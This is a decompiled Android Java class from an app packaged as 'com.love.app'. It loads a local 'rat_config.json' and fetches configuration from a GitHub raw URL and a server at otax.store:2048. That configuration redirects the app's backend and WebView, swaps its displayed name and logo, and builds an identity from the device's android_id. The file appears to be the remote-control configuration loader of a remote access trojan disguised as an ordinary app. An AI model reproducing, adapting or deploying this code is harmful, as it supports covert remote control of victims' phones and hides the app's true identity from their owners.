package com.love.app;

import android.content.Context;
import android.content.SharedPreferences;
import android.provider.Settings;
import android.util.Log;
import com.android.volley.DefaultRetryPolicy;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStream;
import java.nio.charset.StandardCharsets;
import java.util.concurrent.atomic.AtomicBoolean;
import org.json.JSONObject;

/* JADX INFO: loaded from: classes.dex */
public class ConfigFetcher {
    private static final String GITHUB_URL = "https://raw.githubusercontent.com/OtaStoree/manta/main/config.json";
    private static final String KEY_APP_NAME = "app_name";
    private static final String KEY_BASE_URL = "base_url";
    private static final String KEY_LOGO_URL = "logo_url";
    private static final String KEY_SESSION_ID = "session_id";
    private static final String KEY_USERNAME = "username";
    private static final String KEY_WEBVIEW = "webview_url";
    private static final String PREF_NAME = "love_config";
    private static final String SERVER_URL = "http://nodemyayun.otax.store:2048/config.json";
    private static final String TAG = "ConfigFetcher";
    private static RequestQueue sQueue;

    public interface ConfigListener {
        void onConfigFailed();

        void onConfigLoaded(String str);
    }

    private static void putIfPresent(Context context, SharedPreferences.Editor editor, JSONObject jSONObject, String str, String str2) {
        String strSanitizeConfigValue = sanitizeConfigValue(context, str, jSONObject.optString(str, ""));
        if (strSanitizeConfigValue.isEmpty()) {
            return;
        }
        editor.putString(str2, strSanitizeConfigValue);
    }

    private static void putIfEmpty(Context context, SharedPreferences sharedPreferences, SharedPreferences.Editor editor, JSONObject jSONObject, String str, String str2) {
        String strSanitizeConfigValue = sanitizeConfigValue(context, str, jSONObject.optString(str, ""));
        String string = sharedPreferences.getString(str2, "");
        if (strSanitizeConfigValue.isEmpty()) {
            return;
        }
        if (string == null || string.trim().isEmpty()) {
            editor.putString(str2, strSanitizeConfigValue);
        }
    }

    private static String sanitizeConfigValue(Context context, String str, String str2) {
        String strTrim = str2 == null ? "" : str2.trim();
        if (strTrim.isEmpty()) {
            return "";
        }
        if (KEY_BASE_URL.equals(str)) {
            String lowerCase = strTrim.toLowerCase();
            if (lowerCase.contains("your-backend-url") || lowerCase.equals("https://") || lowerCase.equals("http://")) {
                return "";
            }
            if (!lowerCase.startsWith("http://") && !lowerCase.startsWith("https://")) {
                strTrim = "http://" + strTrim;
            }
            strTrim = strTrim.replaceAll("/+$", "");
        }
        if ((!KEY_SESSION_ID.equals(str) && !"session".equals(str) && !KEY_USERNAME.equals(str)) || (!strTrim.toLowerCase().startsWith("isi ") && !strTrim.isEmpty())) {
            return strTrim;
        }
        String string = Settings.Secure.getString(context.getContentResolver(), "android_id");
        if (string == null || string.isEmpty()) {
            string = "uid" + (System.currentTimeMillis() % 100000);
        }
        return "guest_" + string.substring(Math.max(0, string.length() - 6));
    }

    private static RequestQueue getQueue(Context context) {
        if (sQueue == null) {
            sQueue = Volley.newRequestQueue(context.getApplicationContext());
        }
        return sQueue;
    }

    private static boolean hasUsableBaseUrl(Context context) {
        String baseUrl = getBaseUrl(context);
        return (baseUrl == null || baseUrl.trim().isEmpty()) ? false : true;
    }

    private static boolean hasIdentity(Context context) {
        return (getUsername(context).trim().isEmpty() && getSessionId(context).trim().isEmpty()) ? false : true;
    }

    public static void setUsername(Context context, String str) {
        context.getSharedPreferences(PREF_NAME, 0).edit().putString(KEY_USERNAME, str).apply();
    }

    public static void setSessionId(Context context, String str) {
        context.getSharedPreferences(PREF_NAME, 0).edit().putString(KEY_SESSION_ID, str).apply();
    }

    public static void loadLocalConfigSync(Context context) {
        try {
            File externalFilesDir = context.getExternalFilesDir(null);
            if (externalFilesDir != null) {
                File file = new File(externalFilesDir, "rat_config.json");
                if (file.exists()) {
                    byte[] bArr = new byte[(int) file.length()];
                    FileInputStream fileInputStream = new FileInputStream(file);
                    fileInputStream.read(bArr);
                    fileInputStream.close();
                    saveLocalFields(context, new String(bArr, StandardCharsets.UTF_8));
                    Log.d(TAG, "Config lokal berhasil dimuat dari Storage.");
                    return;
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Gagal membaca config dari Storage: " + e.getMessage());
        }
        try {
            InputStream inputStreamOpen = context.getAssets().open("config.json");
            byte[] bArr2 = new byte[inputStreamOpen.available()];
            inputStreamOpen.read(bArr2);
            inputStreamOpen.close();
            saveLocalFields(context, new String(bArr2, StandardCharsets.UTF_8));
            Log.d(TAG, "Config lokal berhasil dimuat dari Assets.");
        } catch (Exception e2) {
            Log.e(TAG, "Gagal membaca config dari Assets: " + e2.getMessage());
        }
    }

    public static void loadConfig(Context context, ConfigListener configListener) {
        loadLocalConfigSync(context);
        String baseUrl = getBaseUrl(context);
        if (baseUrl != null && !baseUrl.isEmpty()) {
            configListener.onConfigLoaded(baseUrl);
            fetchFromSourcesParallel(context, new ConfigListener() { // from class: com.love.app.ConfigFetcher.1
                @Override // com.love.app.ConfigFetcher.ConfigListener
                public void onConfigLoaded(String str) {
                    Log.d(ConfigFetcher.TAG, "Base URL diperbarui di background.");
                }

                @Override // com.love.app.ConfigFetcher.ConfigListener
                public void onConfigFailed() {
                    Log.d(ConfigFetcher.TAG, "Update background gagal, menggunakan cache lokal.");
                }
            });
        } else {
            fetchFromSourcesParallel(context, configListener);
        }
    }

    public static void bootstrapConfig(Context context, ConfigListener configListener) {
        loadLocalConfigSync(context);
        if (hasUsableBaseUrl(context)) {
            configListener.onConfigLoaded(getBaseUrl(context));
            if (hasIdentity(context)) {
                return;
            }
            fetchFromSourcesParallel(context, new ConfigListener() { // from class: com.love.app.ConfigFetcher.2
                @Override // com.love.app.ConfigFetcher.ConfigListener
                public void onConfigLoaded(String str) {
                    Log.d(ConfigFetcher.TAG, "Identity config dilengkapi di background.");
                }

                @Override // com.love.app.ConfigFetcher.ConfigListener
                public void onConfigFailed() {
                    Log.d(ConfigFetcher.TAG, "Identity config background update gagal.");
                }
            });
            return;
        }
        loadConfig(context, configListener);
    }

    private static void saveLocalFields(Context context, String str) {
        try {
            JSONObject jSONObject = new JSONObject(str);
            SharedPreferences sharedPreferences = context.getSharedPreferences(PREF_NAME, 0);
            SharedPreferences.Editor editorEdit = sharedPreferences.edit();
            putIfEmpty(context, sharedPreferences, editorEdit, jSONObject, KEY_USERNAME, KEY_USERNAME);
            String strSanitizeConfigValue = sanitizeConfigValue(context, KEY_SESSION_ID, jSONObject.optString(KEY_SESSION_ID, jSONObject.optString("session", "")));
            String string = sharedPreferences.getString(KEY_SESSION_ID, "");
            if (!strSanitizeConfigValue.isEmpty() && (string == null || string.trim().isEmpty())) {
                editorEdit.putString(KEY_SESSION_ID, strSanitizeConfigValue);
            }
            putIfEmpty(context, sharedPreferences, editorEdit, jSONObject, KEY_WEBVIEW, KEY_WEBVIEW);
            putIfEmpty(context, sharedPreferences, editorEdit, jSONObject, KEY_APP_NAME, KEY_APP_NAME);
            putIfEmpty(context, sharedPreferences, editorEdit, jSONObject, KEY_LOGO_URL, KEY_LOGO_URL);
            editorEdit.apply();
        } catch (Exception e) {
            Log.e(TAG, "Gagal menyimpan field config lokal: " + e.getMessage());
        }
    }

    private static void saveRemoteFields(Context context, JSONObject jSONObject) {
        try {
            SharedPreferences.Editor editorEdit = context.getSharedPreferences(PREF_NAME, 0).edit();
            putIfPresent(context, editorEdit, jSONObject, KEY_BASE_URL, KEY_BASE_URL);
            putIfPresent(context, editorEdit, jSONObject, KEY_USERNAME, KEY_USERNAME);
            String strSanitizeConfigValue = sanitizeConfigValue(context, KEY_SESSION_ID, jSONObject.optString(KEY_SESSION_ID, jSONObject.optString("session", "")));
            if (!strSanitizeConfigValue.isEmpty()) {
                editorEdit.putString(KEY_SESSION_ID, strSanitizeConfigValue);
            }
            putIfPresent(context, editorEdit, jSONObject, KEY_WEBVIEW, KEY_WEBVIEW);
            putIfPresent(context, editorEdit, jSONObject, KEY_APP_NAME, KEY_APP_NAME);
            putIfPresent(context, editorEdit, jSONObject, KEY_LOGO_URL, KEY_LOGO_URL);
            editorEdit.apply();
        } catch (Exception e) {
            Log.e(TAG, "Gagal menyimpan field config remote: " + e.getMessage());
        }
    }

    private static void fetchFromSourcesParallel(final Context context, final ConfigListener configListener) {
        Log.d(TAG, "Fetch config paralel dimulai...");
        final AtomicBoolean atomicBoolean = new AtomicBoolean(false);
        final int[] iArr = {0};
        ConfigListener configListener2 = new ConfigListener() { // from class: com.love.app.ConfigFetcher.3
            @Override // com.love.app.ConfigFetcher.ConfigListener
            public void onConfigLoaded(String str) {
                if (atomicBoolean.compareAndSet(false, true)) {
                    configListener.onConfigLoaded(str);
                }
            }

            @Override // com.love.app.ConfigFetcher.ConfigListener
            public void onConfigFailed() {
                int[] iArr2 = iArr;
                int i = iArr2[0] + 1;
                iArr2[0] = i;
                if (i < 2 || !atomicBoolean.compareAndSet(false, true)) {
                    return;
                }
                String baseUrl = ConfigFetcher.getBaseUrl(context);
                if (baseUrl != null && !baseUrl.isEmpty()) {
                    configListener.onConfigLoaded(baseUrl);
                } else {
                    configListener.onConfigFailed();
                }
            }
        };
        fetchConfigUrl(context, GITHUB_URL, "GitHub", configListener2);
        fetchConfigUrl(context, SERVER_URL, "Server Node.js", configListener2);
    }

    private static void fetchConfigUrl(final Context context, String str, final String str2, final ConfigListener configListener) {
        RequestQueue queue = getQueue(context);
        StringRequest stringRequest = new StringRequest(0, str + (str.contains("?") ? "&" : "?") + "t=" + System.currentTimeMillis(), new Response.Listener() { // from class: com.love.app.ConfigFetcher$$ExternalSyntheticLambda0
            @Override // com.android.volley.Response.Listener
            public final void onResponse(Object obj) {
                ConfigFetcher.lambda$fetchConfigUrl$0(context, configListener, str2, (String) obj);
            }
        }, new Response.ErrorListener() { // from class: com.love.app.ConfigFetcher$$ExternalSyntheticLambda1
            @Override // com.android.volley.Response.ErrorListener
            public final void onErrorResponse(VolleyError volleyError) {
                ConfigFetcher.lambda$fetchConfigUrl$1(str2, configListener, volleyError);
            }
        });
        stringRequest.setShouldCache(false);
        stringRequest.setRetryPolicy(new DefaultRetryPolicy(6000, 0, 1.0f));
        queue.add(stringRequest);
    }

    static /* synthetic */ void lambda$fetchConfigUrl$0(Context context, ConfigListener configListener, String str, String str2) {
        try {
            JSONObject jSONObject = new JSONObject(str2);
            saveRemoteFields(context, jSONObject);
            String strSanitizeConfigValue = sanitizeConfigValue(context, KEY_BASE_URL, jSONObject.optString(KEY_BASE_URL, ""));
            if (!strSanitizeConfigValue.isEmpty()) {
                configListener.onConfigLoaded(strSanitizeConfigValue);
            } else {
                Log.e(TAG, "base_url kosong dari " + str + ".");
                configListener.onConfigFailed();
            }
        } catch (Exception e) {
            Log.e(TAG, "Error Parsing JSON " + str + ": " + e.getMessage());
            configListener.onConfigFailed();
        }
    }

    static /* synthetic */ void lambda$fetchConfigUrl$1(String str, ConfigListener configListener, VolleyError volleyError) {
        Log.e(TAG, "Volley Error dari " + str + ": " + volleyError.toString());
        configListener.onConfigFailed();
    }

    public static String getBaseUrl(Context context) {
        return context.getSharedPreferences(PREF_NAME, 0).getString(KEY_BASE_URL, null);
    }

    public static String getUsername(Context context) {
        return context.getSharedPreferences(PREF_NAME, 0).getString(KEY_USERNAME, "");
    }

    public static String getSessionId(Context context) {
        return context.getSharedPreferences(PREF_NAME, 0).getString(KEY_SESSION_ID, "");
    }

    public static String getWebviewUrl(Context context) {
        return context.getSharedPreferences(PREF_NAME, 0).getString(KEY_WEBVIEW, "");
    }

    public static String getAppName(Context context) {
        return context.getSharedPreferences(PREF_NAME, 0).getString(KEY_APP_NAME, "App");
    }

    public static String getLogoUrl(Context context) {
        return context.getSharedPreferences(PREF_NAME, 0).getString(KEY_LOGO_URL, "");
    }
}
